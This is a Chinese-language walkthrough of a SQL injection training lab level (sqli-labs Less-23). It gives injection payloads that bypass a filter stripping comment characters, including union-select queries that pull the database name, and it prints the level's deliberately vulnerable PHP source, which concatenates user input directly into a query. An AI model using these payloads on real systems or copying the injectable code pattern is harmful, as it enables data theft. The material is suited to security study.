# Less-23 **GET Error Based- no comments**  
TAG：GET型注入、注释符过滤  
## 漏洞利用
![less23_1](images\less23_1.png)  
此less的参数传递模式为GET型  
为了获取更多信息，先传输一个单引号'到页面尝试获取报错信息  
  
payload:```?id='```  
![less23_2](images\less23_2.png)  
分析一下报错信息可知，传入页面的参数被单引号包裹  
尝试使用less1的payload进行攻击  
  
Payload:```?id=-1' or 1=1--+```  
![less23_3](images\less23_3.png)  
  
很明显存在过滤，尝试另一种payload写法  
Payload:```?id=-1' or '1'='1```   
![less23_4](images\less23_4.png)  
此种攻击语句并不需要使用注释符对后半句语句进行注释，规避掉了对注释符的过滤，可以穿透针对注释符过滤的页面    
  
获取回显点位置payload:```?id=-1' union select 1,2,'3```
![less23_5](images\less23_5.png)  
  
获取数据库名payload:```?id=-1' union select 1,database(),'3```  
![less23_6](images\less23_6.png)  

## 源码分析  
### less23源码：  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-23 **Error Based- no comments**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");

// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];

//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#0000ff">';	
  	echo 'Your Login name:'. $row['username'];
  	echo "<br>";
  	echo 'Your Password:' .$row['password'];
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-23.jpg" /></center>
</body>
</html>
```  
  
### 漏洞点分析   
```
...
if(isset($_GET['id'])){
    $id=$_GET['id'];
    $reg = "/#/";
    $reg1 = "/--/";
    $replace = "";
    $id = preg_replace($reg, $replace, $id);
    $id = preg_replace($reg1, $replace, $id);
    $fp=fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
...
``` 
    
在此less中，使用了```preg_replace()```函数来进行对传入参数的过滤  
![less23_7](images\less23_7.png)  
此函数会对输入的参数进行正则匹配，对匹配到的部分字符串进行替换  
```
    $reg = "/#/";
    $reg1 = "/--/";
    $replace = "";
    $id = preg_replace($reg, $replace, $id);
    $id = preg_replace($reg1, $replace, $id);
```
通过函数对输入参数中的所有 ```#``` 与 ```--``` 替换为空字符，从而实现对注释符的过滤操作  
   
### 过滤点突破方法  
使用不需要过滤符进行语句闭合的payload  
页面SQL语句：```$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";```  
  
Payload:```?id=-1' or '1'='1```   
  
加上payload之后  
```$sql="SELECT * FROM users WHERE id='-1' or '1'='1' LIMIT 0,1";```  
此时传递到数据库的语句的```WHERE```条件为```1```，会直接返回```id```为```1```的用户数据  